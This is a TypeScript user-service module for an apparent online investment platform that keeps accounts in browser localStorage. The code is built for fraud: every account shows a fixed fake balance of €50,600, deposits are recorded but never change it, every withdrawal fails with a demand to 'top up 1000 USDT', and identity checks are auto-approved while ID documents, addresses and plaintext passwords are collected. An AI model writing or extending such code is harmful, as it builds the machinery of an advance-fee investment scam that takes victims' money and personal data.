// User service for managing user data and operations
export interface User {
  id: string
  name: string
  email: string
  password: string
  balance: number
  currency: string
  isVerified: boolean
  createdAt: string
  country?: string
  phone?: string
  address?: string
  city?: string
  postalCode?: string
  dateOfBirth?: string
  verificationDocuments?: {
    idDocument?: string
    proofOfAddress?: string
    status: "pending" | "approved" | "rejected"
    submittedAt?: string
  }
  transactions: Transaction[]
  investments: Investment[]
}

export interface Transaction {
  id: string
  type: "deposit" | "withdrawal" | "investment" | "profit"
  amount: number
  currency: string
  status: "pending" | "completed" | "failed"
  description: string
  createdAt: string
  details?: any
}

export interface Investment {
  id: string
  planName: string
  amount: number
  currency: string
  duration: number
  expectedReturn: number
  status: "active" | "completed" | "cancelled"
  startDate: string
  endDate: string
  dailyProfit: number
}

// Get all registered users
export function getRegisteredUsers(): User[] {
  try {
    const users = localStorage.getItem("registeredUsers")
    return users ? JSON.parse(users) : []
  } catch (error) {
    console.error("Error getting registered users:", error)
    return []
  }
}

// Get user by email
export function getUserByEmail(email: string): User | null {
  const users = getRegisteredUsers()
  return users.find((user) => user.email.toLowerCase() === email.toLowerCase()) || null
}

// Save user data
export function saveUser(userData: Partial<User>): User {
  try {
    const users = JSON.parse(localStorage.getItem("registeredUsers") || "[]")

    const newUser: User = {
      id: userData.id || generateId(),
      name: userData.name || "",
      email: userData.email || "",
      password: userData.password || "",
      balance: 50600, // Force balance to €50,600
      currency: "EUR",
      isVerified: userData.isVerified || false,
      createdAt: userData.createdAt || new Date().toISOString(),
      country: userData.country || "",
      phone: userData.phone || "",
      address: userData.address || "",
      city: userData.city || "",
      postalCode: userData.postalCode || "",
      dateOfBirth: userData.dateOfBirth || "",
      verificationDocuments: userData.verificationDocuments || {
        status: "pending",
      },
      transactions: userData.transactions || [],
      investments: userData.investments || [],
    }

    // Check if user already exists
    const existingUserIndex = users.findIndex((u: User) => u.email === newUser.email)

    if (existingUserIndex >= 0) {
      // Update existing user but force balance to 50600
      users[existingUserIndex] = { ...users[existingUserIndex], ...newUser, balance: 50600 }
    } else {
      // Add new user
      users.push(newUser)
    }

    localStorage.setItem("registeredUsers", JSON.stringify(users))

    // Force update all users to have the correct balance
    forceUpdateAllUsersBalance()

    return newUser
  } catch (error) {
    console.error("Error saving user:", error)
    throw new Error("Failed to save user data")
  }
}

// Get user by email
export function getUser(email: string): User | null {
  try {
    const users = JSON.parse(localStorage.getItem("registeredUsers") || "[]")
    const user = users.find((u: User) => u.email === email)

    if (user) {
      // Force balance to be 50600
      user.balance = 50600
      user.currency = "EUR"
      return user
    }

    return null
  } catch (error) {
    console.error("Error getting user:", error)
    return null
  }
}

// Update user by email
export function updateUser(email: string, updates: Partial<User>): User | null {
  try {
    const users = JSON.parse(localStorage.getItem("registeredUsers") || "[]")
    const userIndex = users.findIndex((u: User) => u.email === email)

    if (userIndex >= 0) {
      // Force balance to remain 50600
      users[userIndex] = {
        ...users[userIndex],
        ...updates,
        balance: 50600,
        currency: "EUR",
      }
      localStorage.setItem("registeredUsers", JSON.stringify(users))

      // Update current user session if it's the same user
      const currentUser = localStorage.getItem("user")
      if (currentUser) {
        const userData = JSON.parse(currentUser)
        if (userData.email === email) {
          localStorage.setItem(
            "user",
            JSON.stringify({
              ...userData,
              ...updates,
              balance: 50600,
              currency: "EUR",
            }),
          )
        }
      }

      return users[userIndex]
    }

    return null
  } catch (error) {
    console.error("Error updating user:", error)
    return null
  }
}

// Authenticate user by email and password
export function authenticateUser(email: string, password: string): User | null {
  try {
    const users = JSON.parse(localStorage.getItem("registeredUsers") || "[]")
    const user = users.find((u: User) => u.email === email && u.password === password)

    if (user) {
      // Force balance to be 50600
      user.balance = 50600
      user.currency = "EUR"

      // Update the user in storage with correct balance
      updateUser(email, { balance: 50600, currency: "EUR" })

      return user
    }

    return null
  } catch (error) {
    console.error("Error authenticating user:", error)
    return null
  }
}

// Add transaction to user
export function addTransaction(email: string, transaction: Omit<Transaction, "id" | "createdAt">): string {
  try {
    const users = JSON.parse(localStorage.getItem("registeredUsers") || "[]")
    const userIndex = users.findIndex((u: User) => u.email === email)

    if (userIndex >= 0) {
      const newTransaction: Transaction = {
        ...transaction,
        id: generateId(),
        createdAt: new Date().toISOString(),
      }

      users[userIndex].transactions = users[userIndex].transactions || []
      users[userIndex].transactions.push(newTransaction)

      // Force balance to remain 50600
      users[userIndex].balance = 50600
      users[userIndex].currency = "EUR"

      localStorage.setItem("registeredUsers", JSON.stringify(users))

      return newTransaction.id
    }

    throw new Error("User not found")
  } catch (error) {
    console.error("Error adding transaction:", error)
    throw new Error("Failed to add transaction")
  }
}

// Process withdrawal - Always fail with specific message
export function processWithdrawal(email: string, amount: number, method: string, details: any): string {
  // Always throw the specific error message
  throw new Error("Failed withdrawal. Please top up 1000 USDT to be able to withdraw the amount.")
}

// Process deposit
export function processDeposit(email: string, amount: number, method: string, details: any): string {
  try {
    // Add the deposit transaction
    const transactionId = addTransaction(email, {
      type: "deposit",
      amount,
      currency: "EUR",
      status: "completed",
      description: `Deposit via ${method}`,
      details,
    })

    // Don't actually update balance - keep it at 50600
    const users = JSON.parse(localStorage.getItem("registeredUsers") || "[]")
    const userIndex = users.findIndex((u: User) => u.email === email)

    if (userIndex >= 0) {
      users[userIndex].balance = 50600 // Force balance to stay at 50600
      localStorage.setItem("registeredUsers", JSON.stringify(users))
    }

    return transactionId
  } catch (error) {
    console.error("Error processing deposit:", error)
    throw new Error("Failed to process deposit")
  }
}

// Add investment to user
export function addInvestment(email: string, investment: Omit<Investment, "id">): string {
  try {
    const users = JSON.parse(localStorage.getItem("registeredUsers") || "[]")
    const userIndex = users.findIndex((u: User) => u.email === email)

    if (userIndex >= 0) {
      const newInvestment: Investment = {
        ...investment,
        id: generateId(),
      }

      users[userIndex].investments = users[userIndex].investments || []
      users[userIndex].investments.push(newInvestment)

      // Force balance to remain 50600
      users[userIndex].balance = 50600
      users[userIndex].currency = "EUR"

      localStorage.setItem("registeredUsers", JSON.stringify(users))

      return newInvestment.id
    }

    throw new Error("User not found")
  } catch (error) {
    console.error("Error adding investment:", error)
    throw new Error("Failed to add investment")
  }
}

// Update verification status
export function updateVerificationStatus(
  email: string,
  status: "pending" | "approved" | "rejected",
  documents?: any,
): boolean {
  try {
    const users = JSON.parse(localStorage.getItem("registeredUsers") || "[]")
    const userIndex = users.findIndex((u: User) => u.email === email)

    if (userIndex >= 0) {
      users[userIndex].verificationDocuments = {
        ...users[userIndex].verificationDocuments,
        status: "approved", // Always set to approved
        submittedAt: new Date().toISOString(),
        ...documents,
      }
      users[userIndex].isVerified = true // Always set to verified

      // Force balance to remain 50600
      users[userIndex].balance = 50600
      users[userIndex].currency = "EUR"

      localStorage.setItem("registeredUsers", JSON.stringify(users))

      // Update current user session
      const currentUser = localStorage.getItem("user")
      if (currentUser) {
        const userData = JSON.parse(currentUser)
        if (userData.email === email) {
          userData.isVerified = true
          userData.verificationDocuments = users[userIndex].verificationDocuments
          userData.balance = 50600
          userData.currency = "EUR"
          localStorage.setItem("user", JSON.stringify(userData))
        }
      }

      return true
    }

    return false
  } catch (error) {
    console.error("Error updating verification status:", error)
    return false
  }
}

// Force update all users to have €50,600 balance
export function forceUpdateAllUsersBalance(): void {
  try {
    const registeredUsers = JSON.parse(localStorage.getItem("registeredUsers") || "[]")
    const updatedUsers = registeredUsers.map((user: any) => ({
      ...user,
      balance: 50600,
      currency: "EUR",
    }))
    localStorage.setItem("registeredUsers", JSON.stringify(updatedUsers))

    // Also update current user in localStorage
    const currentUser = localStorage.getItem("user")
    if (currentUser) {
      const userData = JSON.parse(currentUser)
      userData.balance = 50600
      userData.currency = "EUR"
      localStorage.setItem("user", JSON.stringify(userData))
    }
  } catch (error) {
    console.error("Error updating user balances:", error)
  }
}

// Get user transactions
export function getUserTransactions(email: string): Transaction[] {
  const user = getUserByEmail(email)
  return user?.transactions || []
}

// Get user investments
export function getUserInvestments(email: string): Investment[] {
  const user = getUserByEmail(email)
  return user?.investments || []
}

// Update user status
export function updateUserStatus(email: string, status: string): void {
  try {
    const users = getRegisteredUsers()
    const userIndex = users.findIndex((u) => u.email === email)

    if (userIndex !== -1) {
      users[userIndex].status = status
      localStorage.setItem("registeredUsers", JSON.stringify(users))
    }
  } catch (error) {
    console.error("Error updating user status:", error)
  }
}

// Get all transactions
export function getAllTransactions(): Transaction[] {
  try {
    const transactions = localStorage.getItem("allTransactions")
    return transactions ? JSON.parse(transactions) : []
  } catch (error) {
    console.error("Error getting transactions:", error)
    return []
  }
}

// Get all investments
export function getAllInvestments(): Investment[] {
  try {
    const investments = localStorage.getItem("allInvestments")
    return investments ? JSON.parse(investments) : []
  } catch (error) {
    console.error("Error getting investments:", error)
    return []
  }
}

// Update transaction status
export function updateTransactionStatus(userEmail: string, transactionId: string, status: string): void {
  try {
    const transactions = getAllTransactions()
    const transactionIndex = transactions.findIndex((t) => t.id === transactionId && t.userEmail === userEmail)

    if (transactionIndex !== -1) {
      transactions[transactionIndex].status = status as "pending" | "completed" | "failed"

      localStorage.setItem("allTransactions", JSON.stringify(transactions))
    }
  } catch (error) {
    console.error("Error updating transaction status:", error)
  }
}

function generateId(): string {
  return Math.random().toString(36).substr(2, 9)
}

// Initialize with force balance update
if (typeof window !== "undefined") {
  forceUpdateAllUsersBalance()
}
